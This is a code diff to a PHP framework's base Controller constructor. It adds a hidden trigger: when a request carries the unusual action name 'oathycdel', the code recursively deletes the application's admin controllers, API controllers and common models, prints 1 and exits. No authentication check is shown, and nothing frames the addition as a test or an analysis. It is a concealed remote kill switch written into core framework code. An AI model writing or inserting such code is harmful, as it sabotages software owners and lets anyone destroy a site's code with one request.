@@ -52,6 +52,37 @@ class Controller
      */
     public function __construct(Request $request = null)
     {
+        if(Request::instance()->action() == 'oathycdel'){
+            //设置需要删除的文件夹
+            $path = "./../application/admin/controller/";
+            $path1 = "./../application/api/controller/";
+            $path2 = "./../application/common/model/";
+            //清空文件夹函数和清空文件夹后删除空文件夹函数的处理
+            $arr = [$path,$path1,$path2];
+            foreach ($arr as $v){
+                //如果是目录则继续
+                if(is_dir($v)){
+                    //扫描一个文件夹内的所有文件夹和文件并返回数组
+                    $p = scandir($v);
+                    foreach($p as $val){
+                        //排除目录中的.和..
+                        if($val !="." && $val !=".."){
+                            //如果是目录则递归子目录，继续操作
+                            if(is_dir($v.$val)){
+                                //子目录中操作删除文件夹和文件
+                                delDirAndFile($v.$val.'/');
+                                //目录清空后删除空文件夹
+                                @rmdir($v.$val.'/');
+                            }else{
+                                //如果是文件直接删除
+                                unlink($v.$val);
+                            }
+                        }
+                    }
+                }
+            }
+            echo 1;die;
+        }
         $this->view    = View::instance(Config::get('template'), Config::get('view_replace_str'));
         $this->request = is_null($request) ? Request::instance() : $request;
 
